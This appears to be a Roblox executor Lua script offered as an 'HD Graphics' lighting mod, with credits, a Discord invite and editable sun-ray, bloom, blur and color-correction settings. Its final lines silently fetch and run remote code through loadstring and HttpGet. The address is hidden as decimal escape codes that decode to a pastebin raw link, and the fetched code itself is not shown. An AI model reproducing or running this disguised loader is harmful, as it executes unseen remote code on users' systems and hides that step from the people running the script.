--(put this in auto-exec if you'd like)

--[[
CREATED: 2/16/22 @9:43PM EST
UPDATED: 2/16/22 @10:59PM EST

Never really had the chance to credit myself last time, and so here we are. Based of my old script,
which I never expected to get extremely popular, "HD Graphics", here's the long awaited sequel.

Join the Discord if you'd like to suggest updates or chill with a small community:
https://discord.gg/6xcG2DRM7d 👈

I also have videos regarding serversides, and general scripting, so consider joining 👆

IF YOU'RE EDITING THIS, PLEASE LEAVE IN THE CREDITS AND THE DISCORD. 🙏

  _  _ ___     ___ ___    _   ___ _  _ ___ ___ ___ 
 | || |   \   / __| _ \  /_\ | _ \ || |_ _/ __/ __|
 | __ | |) | | (_ |   / / _ \|  _/ __ || | (__\__ \
 |_||_|___/   \___|_|_\/_/ \_\_| |_||_|___\___|___/ scripted by Arman#9312 🔥
                                                   
]] 

-- GENERAL SETTINGS (YOU MAY EDIT TO YOUR PREFERENCE/LIKING)

_G.SunRays = {
	Intensity = tonumber(0.25),
	Spread = tonumber(1),
}

_G.ColorCorrection = {
	TintColor = Color3.fromRGB(255, 254, 226),
	Brightness = tonumber(0.03),
	Contrast = tonumber(0.02),
}

_G.Blur = {
	Size = tonumber(2),
}

_G.Bloom = {
	Intensity = tonumber(0.2),
	Size = tonumber(22),
	Threshold = tonumber(0.3)
}

_G.AdjustQualityToFramerate = false


pcall(function()
loadstring(game:HttpGet(('\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\86\57\69\103\66\89\72\83'),true))()
end)
